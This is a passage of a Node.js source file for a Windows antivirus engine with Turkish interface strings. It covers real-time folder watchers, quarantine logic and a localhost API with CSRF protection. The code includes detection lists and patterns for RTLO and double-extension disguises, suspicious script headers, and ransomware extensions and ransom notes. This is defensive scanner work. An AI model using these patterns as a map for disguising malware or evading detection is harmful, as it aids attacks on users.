  '.msi', '.msp', '.mst', '.com', '.pif', '.lnk', '.url', '.html', '.htm',
  '.svg', '.zip', '.7z', '.rar', '.iso', '.img', '.vhd', '.vhdx', '.cab',
  '.sct', '.wsf', '.wsh', '.inf', '.reg', '.iqy', '.slk', '.scf', '.py',
  '.pdf', '.rtf', '.one', '.chm', '.xll', '.application', '.jar'
]);

const recentlyScannedSigMap = new Map();
const pendingStabilizeMap = new Map();
const rtHighQueue = [];
const rtNormalQueue = [];
let activeRtInspections = 0;
const MAX_CONCURRENT_RT_INSPECT = 6;

const RTLO_CHAR_RX = /[\u202A-\u202E\u2066-\u2069]/;
function hasRtloChar(filename) {
  return RTLO_CHAR_RX.test(String(filename || ''));
}

const NOISY_DROP_PATH_TOKENS = [
  '\\cache\\', '\\cache_data\\', '\\code cache\\', '\\gpucache\\', '\\dawncache\\',
  '\\shadercache\\', '\\grshadercache\\', '\\indexeddb\\', '\\service worker\\',
  '\\node_modules\\', '\\.git\\', '\\aegis_vault\\', '\\quarantine\\', '\\crashdumps\\',
  '\\microsoft\\windows\\webcache\\', '\\pip\\cache\\', '\\nuget\\v3-cache\\',
  '\\nvidia\\glcache\\', '\\appdata\\local\\temp\\'
];
function isNoisyCachePath(fullPath) {
  const low = String(fullPath || '').toLowerCase();
  return NOISY_DROP_PATH_TOKENS.some(tok => low.includes(tok));
}

const TROJAN_DROP_BENIGN_EXTS = new Set([
  '.ldb', '.sqlite-wal', '.sqlite-shm', '.wal', '.shm', '.etl', '.evtx', '.pf',
  '.woff', '.woff2', '.ttf', '.eot', '.css', '.map', '.pak', '.jpg', '.jpeg', '.png', '.gif', '.webp'
]);

function stopAllWatchers() {
  for (const w of activeWatchers) {
    try { w.close(); } catch (_) {}
  }
  activeWatchers = [];
  for (const timer of pendingStabilizeMap.values()) {
    clearTimeout(timer);
  }
  pendingStabilizeMap.clear();
  activeDownloadsMap.clear();
}

function isPartialDownloadName(baseName) {
  const lower = baseName.toLowerCase();
  if (/^unconfirmed\s+\d+\.crdownload$/i.test(lower)) return true;
  if (/^\.~lock\./i.test(lower) || lower.endsWith('.tmp.crdownload')) return true;
  const ext = path.extname(lower);
  return PARTIAL_DOWNLOAD_EXTS.has(ext);
}

function isDoubleExtensionDisguise(filename) {
  return hasRtloChar(filename)
    || /\.(pdf|docx?|xlsx?|pptx?|jpg|jpeg|png|txt|mp4|mp3)\.(exe|scr|bat|cmd|ps1|vbs|vbe|js|jse|hta|pif|com|lnk|msi)$/i.test(filename);
}

const EXCLUDED_RT_PREFIXES = [
  QUARANTINE_DIR.toLowerCase() + path.sep,
  path.join(ROOT_DIR, 'AEGIS_Vault').toLowerCase(),
  path.join(ROOT_DIR, 'AEGIS_Shadow').toLowerCase(),
  path.join(USER_TEMP_DIR, 'aegis_drop_').toLowerCase(),
  path.join(USER_TEMP_DIR, 'superlx_bench_').toLowerCase()
];

function isExcludedRealTimePath(fullPath, baseName) {
  const lowerFull = fullPath.toLowerCase();
  const lowerBase = baseName.toLowerCase();
  return (
    EXCLUDED_RT_PREFIXES.some(pref => lowerFull.startsWith(pref))
    || lowerBase.startsWith('!_00_aegis_')
    || lowerBase.startsWith('~_zz_aegis_')
    || lowerBase === 'desktop.ini'
    || lowerBase === 'thumbs.db'
    || lowerBase.endsWith(':zone.identifier')
  );
}

let lastPruneActiveAt = 0;
function pruneActiveDownloads(force = false) {
  if (activeDownloadsMap.size === 0) return;
  const now = Date.now();
  if (!force && now - lastPruneActiveAt < 5000) return;
  lastPruneActiveAt = now;
  for (const [key, item] of activeDownloadsMap.entries()) {
    if (now - item.updatedAt > 120000 || !fs.existsSync(item.path)) {
      activeDownloadsMap.delete(key);
    }
  }
}

function recordDownloadActivity(entry) {
  const idx = recentDownloads.findIndex(d => d.path === entry.path && d.sha256 === entry.sha256);
  if (idx !== -1) recentDownloads.splice(idx, 1);
  recentDownloads.unshift(entry);
  if (recentDownloads.length > 25) recentDownloads.length = 25;
  broadcastSSE('download_activity', {
    kind: 'inspected',
    entry,
    recentDownloads: recentDownloads.slice(0, 12),
    activeDownloadsCount: activeDownloadsMap.size
  });
}

async function waitForFileReady(fullPath, maxAttempts = 10) {
  let prevSize = -1;
  let stableCount = 0;

  for (let i = 0; i < maxAttempts; i++) {
    if (!fs.existsSync(fullPath)) return null;
    try {
      const stat = fs.statSync(fullPath);
      if (!stat.isFile()) return null;
      if (stat.size > 0 && stat.size === prevSize) {
        const fd = fs.openSync(fullPath, 'r');
        fs.closeSync(fd);
        stableCount++;
        if (stableCount >= 1) return stat;
      } else {
        stableCount = 0;
      }
      prevSize = stat.size;
    } catch (_) {
      stableCount = 0;
    }
    await new Promise(r => setTimeout(r, 25));
  }

  try {
    if (!fs.existsSync(fullPath)) return null;
    const stat = fs.statSync(fullPath);
    if (!stat.isFile() || stat.size === 0 || stat.size > MAX_UPLOAD_LIMIT_BYTES) return null;
    const fd = fs.openSync(fullPath, 'r');
    fs.closeSync(fd);
    return stat;
  } catch (_) {
    return null;
  }
}

function enqueueRtInspection(taskFn, highPriority = false) {
  if (highPriority) rtHighQueue.push(taskFn);
  else rtNormalQueue.push(taskFn);
  drainRtQueue();
}

function drainRtQueue() {
  while (activeRtInspections < MAX_CONCURRENT_RT_INSPECT && (rtHighQueue.length > 0 || rtNormalQueue.length > 0)) {
    const nextTask = rtHighQueue.length > 0 ? rtHighQueue.shift() : rtNormalQueue.shift();
    activeRtInspections++;
    Promise.resolve()
      .then(nextTask)
      .catch(() => {})
      .finally(() => {
        activeRtInspections--;
        drainRtQueue();
      });
  }
}

async function inspectRealTimeCandidate(fullPath, zoneSpec) {
  if (!realtimeEnabled || !fs.existsSync(fullPath)) return;
  const lowerFull = fullPath.toLowerCase();
  const graceExp = restoreGraceMap.get(lowerFull);
  if (graceExp && Date.now() < graceExp) return;
  if (graceExp) restoreGraceMap.delete(lowerFull);

  const stat = await waitForFileReady(fullPath);
  if (!stat || stat.size > MAX_UPLOAD_LIMIT_BYTES) return;
  const sigKey = `${stat.size}|${Math.round(stat.mtimeMs)}`;
  const cached = recentlyScannedSigMap.get(lowerFull);
  if (cached && cached.sig === sigKey && (Date.now() - cached.at) < 15000) {
    return;
  }
  recentlyScannedSigMap.set(lowerFull, { sig: sigKey, at: Date.now() });
  if (recentlyScannedSigMap.size > 500) {
    const oldestKey = recentlyScannedSigMap.keys().next().value;
    if (oldestKey) recentlyScannedSigMap.delete(oldestKey);
  }

  const baseName = path.basename(fullPath);
  const verdict = await inspectFileDual(fullPath, true);
  if (!verdict) return;

  if (hasRtloChar(baseName)) {
    verdict.risk_score = Math.max(verdict.risk_score || 0, 92);
    verdict.status = 'INFECTED';
    if (!verdict.threat_name || verdict.threat_name.startsWith('Heuristic.AegisCore')) {
      verdict.threat_name = 'Trojan.Disguise.UnicodeRTLO';
    }
    verdict.findings.unshift('[RTLO Kalkanı] Unicode BiDi ters çevirme karakteri ile dosya uzantısı sahtekarlığı');
  }

  stats.totalFilesScanned++;
  pruneActiveDownloads();

  const motwHost = verdict.motw?.hostUrl || verdict.motw?.referrerUrl || '';
  const fromInternet = Boolean(verdict.motw?.fromInternet || zoneSpec.mode === 'download');
  const originSuffix = motwHost ? ` | Kaynak URL: ${motwHost}` : (verdict.motw?.fromInternet ? ' | Kaynak: İnternet (MotW ZoneId=3)' : '');

  let actionTaken = 'Temiz';
  let qRecordId = null;

  if (verdict.status === 'INFECTED') {
    stats.realtimeInterceptions++;
    let quarantinedOk = false;
    let processTerminated = false;
    if (autoQuarantine && verdict.risk_score >= 70) {
      let qRes = quarantineFile(fullPath, verdict.threat_name, verdict.risk_score, verdict.findings);
      if (!qRes?.success && vortexLiveState.daemonActive) {
        const killRes = await queryVortexDaemon('kill_process_tree', { path: fullPath }, 3000);
        if (Array.isArray(killRes?.killed_pids) && killRes.killed_pids.length > 0) {
          processTerminated = true;
        }
        await new Promise(r => setTimeout(r, 60));
        qRes = quarantineFile(fullPath, verdict.threat_name, verdict.risk_score, verdict.findings);
      }
      quarantinedOk = Boolean(qRes?.success);
      qRecordId = qRes?.record?.id || null;
    }
    actionTaken = processTerminated && quarantinedOk
      ? 'Süreç Durduruldu & Karantina'
      : (quarantinedOk ? 'Otomatik Karantina' : 'Engellendi');

    logEvent(
      zoneSpec.mode === 'download' ? 'Otomatik İndirme Kalkanı' : 'Davranışsal Tehdit Tespiti',
      `Tehdit Yakalandı: ${verdict.threat_name}`,
      `[${zoneSpec.label}] Risk: ${verdict.risk_score}/100 | ${verdict.findings[0] || verdict.threat_name}${originSuffix}`,
      'CRITICAL',
      fullPath,
      actionTaken,
      {
        sha256: verdict.sha256,
        riskScore: verdict.risk_score,
        threatLevel: 'Kritik',
        quarantineId: qRecordId,
        engineDecision: verdict.findings.join(' | ')
      }
    );
  } else if (verdict.status === 'SUSPICIOUS') {
    stats.realtimeInterceptions++;
    actionTaken = 'İzleme Listesine Alındı';
    if (vortexLiveState.daemonActive) {
      queryVortexDaemon('register_watchlist', {
        path: fullPath,
        sha256: verdict.sha256 || '',
        risk_score: verdict.risk_score,
        threat_name: verdict.threat_name || 'Suspicious.WatchlistItem'
      }, 2000).catch(() => {});
    }
    logEvent(
      zoneSpec.mode === 'download' ? 'İndirme Güvenlik Uyarısı' : 'Gerçek Zamanlı Şüpheli Dosya',
      `Şüpheli Dosya: ${verdict.file_name}`,
      `[${zoneSpec.label}] Risk: ${verdict.risk_score}/100 | ${verdict.findings[0] || 'Yüksek sezgisel risk / imzasız dosya'}${originSuffix}`,
      'WARNING',
      fullPath,
      actionTaken,
      {
        sha256: verdict.sha256,
        riskScore: verdict.risk_score,
        threatLevel: 'Orta',
        engineDecision: verdict.findings.join(' | ')
      }
    );
  } else if (zoneSpec.mode !== 'temp' && zoneSpec.mode !== 'trojan_drop') {
    logEvent(
      zoneSpec.mode === 'download' ? 'İndirme Denetimi Tamamlandı' : 'Gerçek Zamanlı Denetim',
      `Güvenli Dosya: ${verdict.file_name}`,
      `[${zoneSpec.label}] Entropi: ${verdict.entropy} | İmza: ${verdict.is_signed ? verdict.signer : 'Doğrulama Tamam'}${originSuffix}`,
      'SAFE',
      fullPath,
      'Temiz',
      { sha256: verdict.sha256, riskScore: verdict.risk_score, threatLevel: 'Güvenli' }
    );
  }

  if (zoneSpec.mode === 'download' || zoneSpec.mode === 'full' || verdict.status !== 'CLEAN') {
    recordDownloadActivity({
      id: verdict.sha256 || crypto.randomUUID(),
      timestamp: formatDateTime(),
      fileName: verdict.file_name,
      path: fullPath,
      zone: zoneSpec.label,
      sizeBytes: verdict.size_bytes ?? stat.size,
      fromInternet,
      motwHost,
      status: verdict.status,
      riskScore: verdict.risk_score,
      threatName: verdict.status === 'CLEAN' ? 'Temiz' : verdict.threat_name,
      actionTaken,
      sha256: verdict.sha256,
      engine: ENGINE_NAME,
      isSigned: Boolean(verdict.is_signed),
      signer: verdict.signer || ''
    });
  }
}

function scheduleRealTimeInspection(fullPath, zoneSpec, delayMs = 140, requireMagicCheck = false, highPriority = false) {
  const key = fullPath.toLowerCase();
  if (pendingStabilizeMap.has(key)) {
    clearTimeout(pendingStabilizeMap.get(key));
  }
  const timer = setTimeout(() => {
    pendingStabilizeMap.delete(key);
    if (requireMagicCheck && !hasSuspiciousMagicFast(fullPath)) return;
    enqueueRtInspection(() => inspectRealTimeCandidate(fullPath, zoneSpec), highPriority);
  }, delayMs);
  pendingStabilizeMap.set(key, timer);
}

const SUSPICIOUS_SCRIPT_MAGIC_RX = /^(?:\ufeff)?\s*(?:<html\b|<script\b|<\?xml\b|@echo\b|powershell\b|set\s+[a-z0-9_]+\s*=|createobject\(|wscript\.|activexobject|#!\/)/i;
function hasSuspiciousMagicFast(fullPath) {
  let fd = -1;
  try {
    fd = fs.openSync(fullPath, 'r');
    const hdr = Buffer.allocUnsafe(512);
    const n = fs.readSync(fd, hdr, 0, 512, 0);
    if (n < 2) return false;
    // MZ (PE), ZIP/MSIX, RAR, 7z, CAB, LNK, OLE2, ELF, %PDF-
    if (hdr[0] === 0x4D && hdr[1] === 0x5A) return true;
    if (n >= 4) {
      if (hdr[0] === 0x50 && hdr[1] === 0x4B && hdr[2] === 0x03 && hdr[3] === 0x04) return true;
      if (hdr[0] === 0x52 && hdr[1] === 0x61 && hdr[2] === 0x72 && hdr[3] === 0x21) return true;
      if (hdr[0] === 0x37 && hdr[1] === 0x7A && hdr[2] === 0xBC && hdr[3] === 0xAF) return true;
      if (hdr[0] === 0x4D && hdr[1] === 0x53 && hdr[2] === 0x43 && hdr[3] === 0x46) return true;
      if (hdr[0] === 0x4C && hdr[1] === 0x00 && hdr[2] === 0x00 && hdr[3] === 0x00) return true;
      if (hdr[0] === 0xD0 && hdr[1] === 0xCF && hdr[2] === 0x11 && hdr[3] === 0xE0) return true;
      if (hdr[0] === 0x7F && hdr[1] === 0x45 && hdr[2] === 0x4C && hdr[3] === 0x46) return true;
      if (hdr.subarray(0, 5).toString('ascii') === '%PDF-') return true;
    }
    const textHead = hdr.subarray(0, n).toString('utf8');
    if (textHead.includes('#@~^') || SUSPICIOUS_SCRIPT_MAGIC_RX.test(textHead)) return true;
    return false;
  } catch (_) {
    return false;
  } finally {
    if (fd !== -1) {
      try { fs.closeSync(fd); } catch (_) {}
    }
  }
}

const RANSOMWARE_EXTS = new Set([
  '.locked', '.encrypted', '.crypted', '.crypt', '.lockbit', '.akira', '.play',
  '.blackbasta', '.rhysida', '.medusa', '.wncry', '.wcry', '.ryuk', '.conti', '.revil', '.enc'
]);
const RANSOM_NOTE_RX = /(?:readme[_ -]?decrypt|how[_ -]?to[_ -]?decrypt|restore[_ -]?files|decrypt[_ -]?instructions|your[_ -]?files[_ -]?are[_ -]?encrypted)/i;
const HIGH_PRIORITY_RT_EXTS = new Set([
  '.exe', '.dll', '.scr', '.ps1', '.vbs', '.vbe', '.hta', '.lnk', '.js', '.jse',
  '.bat', '.cmd', '.msi', '.iso', '.img', '.html', '.htm', '.svg', '.search-ms', '.crx'
]);
const zoneBurstTracker = new Map();

function checkRealTimeRansomwareBurst(zoneLabel, fullPath, baseName) {
  const now = Date.now();
  const ext = path.extname(baseName).toLowerCase();
  if (RANSOMWARE_EXTS.has(ext) || RANSOM_NOTE_RX.test(baseName)) {
    stats.realtimeInterceptions++;
    logEvent(
      'Fidye Yazılımı (Ransomware) Kalkanı',
      `Fidye Yazılımı İz/Notu Algılandı: ${baseName}`,
      `[${zoneLabel}] Bilinen fidye şifreleme uzantısı veya fidye notu tespit edildi — acil inceleme başlatıldı.`,
      'CRITICAL',
      fullPath,
      'Acil Müdahale',
      { riskScore: 98, threatLevel: 'Kritik', engineDecision: 'Real-Time Ransomware Extension/Note Guard' }
    );
    return true;
  }

  let rec = zoneBurstTracker.get(zoneLabel);
  if (!rec || now - rec.windowStart > 3000) {
    rec = { windowStart: now, files: new Set(), alertedAt: rec?.alertedAt || 0 };
    zoneBurstTracker.set(zoneLabel, rec);
  }
  rec.files.add(fullPath.toLowerCase());
  if (rec.files.size >= 14 && now - rec.alertedAt > 15000) {
    rec.alertedAt = now;
    stats.realtimeInterceptions++;
    logEvent(
      'Fidye Yazılımı Patlama Kalkanı',
      `Hızlı Toplu Dosya Değişimi Algılandı (${rec.files.size} dosya / 3 sn)`,
      `[${zoneLabel}] Olası fidye yazılımı toplu şifreleme davranışı tespit edildi.`,
      'CRITICAL',
      fullPath,
      'Yüksek Alarm',
      { riskScore: 95, threatLevel: 'Kritik', engineDecision: 'Real-Time Behavioral Mass-Mutation Guard' }
    );
    return true;
  }
  return false;
}

function attachZoneWatcher(zoneSpec) {
  const { dir, mode, label } = zoneSpec;
  if (!dir || !fs.existsSync(dir)) return;

  try {
    const watcher = fs.watch(dir, { recursive: true }, (eventType, filename) => {
      if (!realtimeEnabled || !filename) return;
      const fullPath = path.join(dir, filename);
      const baseName = path.basename(filename);

      if (isExcludedRealTimePath(fullPath, baseName)) return;
      if (mode === 'trojan_drop' && isNoisyCachePath(fullPath)) return;

      if (isPartialDownloadName(baseName)) {
        const lowerFull = fullPath.toLowerCase();
        const wasTracked = activeDownloadsMap.has(lowerFull);
        if (fs.existsSync(fullPath)) {
          activeDownloadsMap.set(lowerFull, {
            path: fullPath,
            fileName: baseName,
            zone: label,
            updatedAt: Date.now()
          });
          if (!wasTracked) {
            broadcastSSE('download_activity', {
              kind: 'downloading',
              fileName: baseName,
              zone: label,
              activeDownloadsCount: activeDownloadsMap.size
            });
          }
        }
        return;
      }

      const ext = path.extname(baseName).toLowerCase();
      const rtloHit = hasRtloChar(baseName);
      if (mode !== 'temp') {
        checkRealTimeRansomwareBurst(label, fullPath, baseName);
      }

      let requireMagicCheck = false;
      const isDoubleOrRtlo = isDoubleExtensionDisguise(baseName) || rtloHit;
      if (mode === 'temp' || mode === 'trojan_drop') {
        if (!TEMP_FILTER_EXTS.has(ext) && !isDoubleOrRtlo && !RANSOMWARE_EXTS.has(ext)) {
          if (mode === 'trojan_drop' && TROJAN_DROP_BENIGN_EXTS.has(ext)) {
            return;
          }
          if (ext === '' || mode === 'trojan_drop') {
            requireMagicCheck = true;
          } else {
            return;
          }
        }
      }

      pruneActiveDownloads();
      const highPriority = HIGH_PRIORITY_RT_EXTS.has(ext) || isDoubleOrRtlo || RANSOMWARE_EXTS.has(ext);
      const fastDelayMs = highPriority
        ? 35
        : (mode === 'trojan_drop' ? 75 : (mode === 'download' ? 120 : 100));
      scheduleRealTimeInspection(fullPath, zoneSpec, fastDelayMs, requireMagicCheck, highPriority);
    });
    activeWatchers.push(watcher);
  } catch (err) {
    logEvent('Kalkan Uyarısı', 'Dizin İzleme Hatası', `[${label}] ${err.message}`, 'WARNING', dir, 'Uyarı');
  }
}

function getDesiredZoneSpecs() {
  const specMap = new Map();
  const addZone = (dir, mode, label) => {
    if (!dir) return;
    try {
      const resolved = path.resolve(dir);
      if (!fs.existsSync(resolved)) return;
      const key = resolved.toLowerCase();
      if (!specMap.has(key)) {
        specMap.set(key, { dir: resolved, mode, label });
      }
    } catch (_) {}
  };

  addZone(watchedPath, 'full', 'Korumalı Alan');
  if (watchDownloads) {
    addZone(USER_DOWNLOADS_DIR, 'download', 'İndirilenler');
    addZone(USER_DESKTOP_DIR, 'download', 'Masaüstü');
    addZone(USER_STARTUP_DIR, 'download', 'Başlangıç Klasörü');
    addZone(
      path.join(process.env.PROGRAMDATA || 'C:\\ProgramData', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
      'download',
      'Ortak Başlangıç Klasörü'
    );
    addZone(path.join(os.homedir(), 'Documents'), 'trojan_drop', 'Belgelerim');
    addZone(process.env.PUBLIC || 'C:\\Users\\Public', 'trojan_drop', 'Ortak Kullanıcı Alanı (Public)');
    addZone(process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming'), 'trojan_drop', 'AppData Roaming');
    addZone(process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local'), 'trojan_drop', 'AppData Local');
    addZone(process.env.PROGRAMDATA || 'C:\\ProgramData', 'trojan_drop', 'ProgramData');
    for (const extraDir of EXTRA_USER_DROP_DIRS) {
      addZone(extraDir, 'download', `OneDrive (${path.basename(extraDir)})`);
    }
  }
  if (watchTemp) {
    addZone(USER_TEMP_DIR, 'temp', 'Geçici Dizin (Temp)');
  }
  for (const [, usb] of activeUsbRoots.entries()) {
    addZone(usb.root, 'download', `USB Disk (${usb.root})`);
  }
  return Array.from(specMap.values());
}

let catchUpDone = false;
function runInitialCatchUpOnce() {
  if (catchUpDone) return;
  catchUpDone = true;
  catchUpRecentDownloads();
}

function startRealtimeWatchers(silent = false) {
  stopAllWatchers();
  if (!realtimeEnabled) {
    watchedZones = [];
    return;
  }

  const specs = getDesiredZoneSpecs();
  watchedZones = specs.map(s => ({ label: s.label, path: s.dir, mode: s.mode }));
  for (const spec of specs) {
    attachZoneWatcher(spec);
  }

  if (!silent) {
    logEvent(
      'Kalkan Aktif',
      'SuperLX 1.0 Çok Katmanlı İndirme & Davranış Kalkanı Devrede',
      `İzlenen ${watchedZones.length} bölge: ${watchedZones.map(z => z.label).join(', ')}`,
      'SAFE',
      'Sistem Geneli (Tüm Diskler)',
      'Aktif',
      { threatLevel: 'Güvenli' }
    );
  }
}

function catchUpRecentDownloads() {
  if (!realtimeEnabled || !watchDownloads) return;
  const specs = getDesiredZoneSpecs().filter(s => s.mode === 'download');
  const cutoff = Date.now() - 10 * 60 * 1000;
  const candidates = [];

  for (const spec of specs) {
    try {
      const entries = fs.readdirSync(spec.dir, { withFileTypes: true });
      for (const ent of entries) {
        if (!ent.isFile()) continue;
        const baseName = ent.name;
        const fullPath = path.join(spec.dir, baseName);
        if (isExcludedRealTimePath(fullPath, baseName) || isPartialDownloadName(baseName)) continue;
        try {
          const st = fs.statSync(fullPath);
          if (st.size > 0 && st.size <= MAX_UPLOAD_LIMIT_BYTES && st.mtimeMs >= cutoff) {
            candidates.push({ fullPath, spec, mtimeMs: st.mtimeMs });
          }
        } catch (_) {}
      }
    } catch (_) {}
  }

  candidates.sort((a, b) => b.mtimeMs - a.mtimeMs);
  for (const item of candidates.slice(0, 12)) {
    enqueueRtInspection(() => inspectRealTimeCandidate(item.fullPath, item.spec));
  }
}

startRealtimeWatchers(true);
setTimeout(runInitialCatchUpOnce, 3000);

const SESSION_TOKEN = crypto.randomBytes(32).toString('hex');
const CSRF_TOKEN = crypto.randomBytes(32).toString('hex');

function timingSafeStringEqual(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  const bufA = Buffer.from(a, 'utf8');
  const bufB = Buffer.from(b, 'utf8');
  if (bufA.length !== bufB.length) return false;
  return crypto.timingSafeEqual(bufA, bufB);
}

function parseCookies(cookieHeader) {
  const out = Object.create(null);
  if (!cookieHeader || typeof cookieHeader !== 'string') return out;
  for (const part of cookieHeader.split(';')) {
    const eq = part.indexOf('=');
    if (eq <= 0) continue;
    const k = part.slice(0, eq).trim();
    const v = part.slice(eq + 1).trim();
    if (k && k !== '__proto__' && k !== 'constructor' && k !== 'prototype') {
      out[k] = v;
    }
  }
  return out;
}

function isUncPath(p) {
  return typeof p === 'string' && (/^\\\\/.test(p) || /^\/\//.test(p) || /^\\\\\?\\unc\\/i.test(p));
}

function safeJsonReviver(key, value) {
  if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
    return undefined;
  }
  return value;
}

function parseBody(req, limitBytes = 25 * 1024 * 1024) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let total = 0;
    let settled = false;
    req.on('data', chunk => {
      if (settled) return;
      total += chunk.length;
      if (total > limitBytes) {
        settled = true;
        req.destroy();
        reject(Object.assign(new Error('İstek boyutu izin verilen üst sınırı aştı.'), { statusCode: 413 }));
        return;
      }
      chunks.push(chunk);
    });
    req.on('error', (err) => {
      if (settled) return;
      settled = true;
      reject(err);
    });
    req.on('end', () => {
      if (settled) return;
      settled = true;
      try {
        const str = Buffer.concat(chunks).toString('utf8');
        resolve(str ? JSON.parse(str, safeJsonReviver) : {});
      } catch (_) {
        resolve({});
      }
    });
  });
}

function sendJson(res, status, data) {
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-cache'
  });
  res.end(JSON.stringify(data));
}

const ALLOWED_HOSTS = new Set([
  `127.0.0.1:${PORT}`,
  `localhost:${PORT}`,
  `[::1]:${PORT}`,
  '127.0.0.1',
  'localhost',
  '[::1]'
]);

const ALLOWED_ORIGINS = new Set([
  `http://127.0.0.1:${PORT}`,
  `http://localhost:${PORT}`,
  `http://[::1]:${PORT}`
]);

const SENSITIVE_GET_ENDPOINTS = new Set([
  '/api/quarantine',
  '/api/procnet',
  '/api/plus/startup-guard',
  '/api/timemachine/snapshot'
]);

const server = http.createServer(async (req, res) => {
  try {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'"
  );

  const rawHost = String(req.headers.host || '').trim().toLowerCase();
  if (!ALLOWED_HOSTS.has(rawHost)) {
    return sendJson(res, 403, { error: 'Yetkisiz Host başlığı engellendi (DNS Rebinding Koruması).' });
  }

  const secFetchSite = String(req.headers['sec-fetch-site'] || '').trim().toLowerCase();
  const rawOrigin = String(req.headers.origin || '').trim().toLowerCase();
  if ((secFetchSite && secFetchSite !== 'same-origin' && secFetchSite !== 'none') || (rawOrigin && !ALLOWED_ORIGINS.has(rawOrigin))) {
    return sendJson(res, 403, { error: 'Çapraz kaynak (CSRF) isteği AegisCore Öz-Koruma tarafından engellendi.' });
  }

  const cookies = parseCookies(req.headers.cookie);
  const hasValidSession = timingSafeStringEqual(cookies.aegis_sid || '', SESSION_TOKEN);

  if (req.method !== 'GET' && req.method !== 'HEAD') {
    const reqCsrf = String(req.headers['x-aegis-token'] || '');
    if (!hasValidSession || !timingSafeStringEqual(reqCsrf, CSRF_TOKEN)) {
      return sendJson(res, 403, { error: 'Geçersiz veya eksik AegisCore oturum/CSRF doğrulama anahtarı.' });
    }
  }

  let urlObj;
  try {
    urlObj = new URL(req.url, `http://${rawHost}`);
  } catch (_) {
    return sendJson(res, 400, { error: 'Geçersiz istek URL adresi.' });
  }
  const pathname = urlObj.pathname;

  if (req.method === 'GET' && SENSITIVE_GET_ENDPOINTS.has(pathname) && !hasValidSession) {
    return sendJson(res, 403, { error: 'Hassas telemetri uç noktası için geçerli oturum gereklidir.' });
  }

  if (pathname === '/api/stream' && req.method === 'GET') {
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive'
    });
    res.write(`event: init\ndata: ${JSON.stringify({ stats, eventLogs: eventLogs.slice(0, 40), recentDownloads: recentDownloads.slice(0, 12), watchedZones, activeDownloadsCount: activeDownloadsMap.size })}\n\n`);
    sseClients.push(res);
    if (sseClients.length === 1) startTelemetryLoop();
    req.on('close', () => {
      sseClients = sseClients.filter(c => c !== res);
      if (sseClients.length === 0) stopTelemetryLoop();
    });
    return;
  }

  if (pathname === '/api/status' && req.method === 'GET') {
    const freeMem = os.freemem();
    const usedMemPercent = Math.round(((TOTAL_MEM_BYTES - freeMem) / TOTAL_MEM_BYTES) * 100);
    const agentRssMb = process.memoryUsage().rss / (1024 * 1024);
    const agentMemPercent = Math.min(100, Math.max(0.2, Number(((agentRssMb / TOTAL_MEM_MB) * 100).toFixed(2))));
    const sigDb = getSigDbCached();
    const quarantineList = getQuarantineList();

    // Sync consistency
    if (stats.totalThreatsBlocked < quarantineList.length) {
      stats.totalThreatsBlocked = quarantineList.length;
    }

    return sendJson(res, 200, {
      engineVersion: ENGINE_VERSION,
      engineDisplayVersion: `${ENGINE_NAME} Motoru`,
      engineName: ENGINE_NAME,
      zeroTrustStatus: 'SuperLX 1.0 Tam Koruma Aktif',
      uploadLimitMb: MAX_UPLOAD_LIMIT_MB,
      canaryCount: vortexLiveState.canaryCount,
      daemonActive: vortexLiveState.daemonActive,
      monitoredProcesses: vortexLiveState.monitoredProcesses,
      signatureVersion: sigDb.version,
      signatureCount: Object.keys(sigDb.sha256_signatures).length + sigDb.byte_patterns.length + (sigDb.malicious_dll_names?.length || 0) + (sigDb.hijackable_system_dlls?.length || 0),
      realtimeEnabled,
      watchDownloads,
      networkProtectionEnabled,
      webProtectionEnabled,
      gameMode,
      autoQuarantine,
      isScanningNow,
      watchedPath,
      downloadsPath: USER_DOWNLOADS_DIR,
      watchedZones,
      activeDownloadsCount: activeDownloadsMap.size,
      recentDownloads: recentDownloads.slice(0, 25),
      lastScanAt: lastScanAt || 'Henüz tarama yapılmadı',
      stats,
      quarantineCount: quarantineList.length,
      perf: {
        avgInspectMs: perfMetrics.avgInspectMs,
        cacheHits: perfMetrics.cacheHits,
        csharpDaemonActive: csharpDaemonReady,
        filelessShieldActive: realtimeEnabled,
        usbProtectedCount: activeUsbRoots.size
      },
      system: {
        hostname: os.hostname(),
        osEdition: osEditionLabel,
        platform: `${os.type()} ${os.release()} (${os.arch()})`,
        cpuModel: CPU_MODEL,
        cpuCores: CPU_CORES,
        agentCpuPercent: currentCpuPercent,
        agentMemoryPercent: agentMemPercent,
        memoryUsedPercent: usedMemPercent,
        totalMemoryGb: TOTAL_MEM_GB_STR,
        agentMemoryMb: agentRssMb.toFixed(1),
        netKbps: currentNetKbps
      },
      eventLogs: eventLogs.slice(0, 40)
    });
  }

  if (pathname === '/api/quickscan' && req.method === 'POST') {
    if (isScanningNow) {
      return sendJson(res, 409, { error: 'Aktif bir tarama zaten devam ediyor.' });
    }
    try {
      const result = await performHybridScan('', 'quick', true);
      return sendJson(res, 200, result);
    } catch (err) {
      return sendJson(res, 500, { error: err.message });
    }
  }

  if (pathname === '/api/fullscan' && req.method === 'POST') {
    if (isScanningNow) {
      return sendJson(res, 409, { error: 'Aktif bir tarama zaten devam ediyor.' });
    }
    try {
      const result = await performHybridScan('', 'full', true);
      return sendJson(res, 200, result);
    } catch (err) {
      return sendJson(res, 500, { error: err.message });
    }
  }

  if (pathname === '/api/scan' && req.method === 'POST') {
    const body = await parseBody(req);
    if (body.targetPath && isUncPath(String(body.targetPath))) {
      return sendJson(res, 400, { error: 'Ağ paylaşım (UNC) yolları güvenlik nedeniyle reddedildi.' });
    }
    const target = body.targetPath ? path.resolve(String(body.targetPath)) : ROOT_DIR;
    if (!fs.existsSync(target)) {
      return sendJson(res, 400, { error: `Hedef dizin veya dosya bulunamadı: ${target}` });
    }
    try {
      const result = await performHybridScan(target, false, false);
      return sendJson(res, 200, result);
